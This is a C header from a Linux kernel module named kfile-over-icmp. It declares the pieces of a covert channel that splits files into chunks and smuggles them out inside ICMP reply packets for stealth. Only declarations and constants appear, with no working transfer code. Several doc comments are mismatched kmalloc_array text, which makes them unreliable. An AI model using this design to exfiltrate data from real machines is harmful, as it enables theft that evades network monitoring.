/**
 * This file is part of the kfile-over-icmp module (https://github.com/spiderpig1297/kfile-over-icmp).
 * Copyright (c) 2020 spiderpig1297.
 * 
 * This program is free software: you can redistribute it and/or modify  
 * it under the terms of the GNU General Public License as published by  
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but 
 * WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU 
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License 
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */
#pragma once

#include <linux/spinlock_types.h>
#include <linux/list.h>

#include "../net/netfilter.h"
#include "../utils/modifiers/data_modifier.h"

extern struct list_head g_chunk_list;
extern spinlock_t g_chunk_list_spinlock;

static const size_t DEFAULT_PAYLOAD_CHUNKS_SIZE = 64;  // in bytes
static const char DEFAULT_NEW_FILE_SIGNATURE[] = { 0xDE, 0xAD, 0xBE, 0xEF,
                                                   0xDE, 0xAD, 0xBE, 0xEF };

/**
 * Struct for storing file's signature.
 * Each file sent by the module is marked by this struct, which contains the file
 * size and a unique signature. This struct will then be used when parsing the ICMP 
 * packets to differentiate between the sent files.
 */
struct new_file_signature {
    const char signature[4];
    size_t file_size;
    // TODO: add an id or path for the file?
};

/**
 * Struct for storing chunks.
 * In order to maximize on performance and to maintain stealth, each file is splitted
 * to chunks, each chunk limited by the size DEFAULT_PAYLOAD_CHUNKS_SIZE.
 * get_payload is the function responsible for handing the chunks to the netfilter 
 * hook, where each chunk will be sent on top of a single ICMP-reply packet.
 */
struct file_chunk {
    const char *data;
    size_t chunk_size;
    struct list_head l_head;
};

/**
 * kmalloc_array - allocate memory for an array.
 * @n: number of elements.
 * @size: element size.
 * @flags: the type of memory to allocate (see kmalloc).
 * NOTE: assumes that buffer was already allocated by the caller and with sufficient size.
 */
int generate_payload(char *buffer, size_t *length);

/**
 * kmalloc_array - allocate memory for an array.
 * @n: number of elements.
 * @size: element size.
 * @flags: the type of memory to allocate (see kmalloc).
 */
int start_payload_generator_thread(void);

/**
 * kmalloc_array - allocate memory for an array.
 * @n: number of elements.
 * @size: element size.
 * @flags: the type of memory to allocate (see kmalloc).
 */
void stop_payload_generator_thread(void);

/**
 * kmalloc_array - allocate memory for an array.
 * @n: number of elements.
 * @size: element size.
 * @flags: the type of memory to allocate (see kmalloc).
 */
size_t get_default_payload_chunk_size(void);

/**
 * kmalloc_array - allocate memory for an array.
 * @n: number of elements.
 * @size: element size.
 * @flags: the type of memory to allocate (see kmalloc).
 */
int payload_generator_add_modifier(data_modifier_func func);
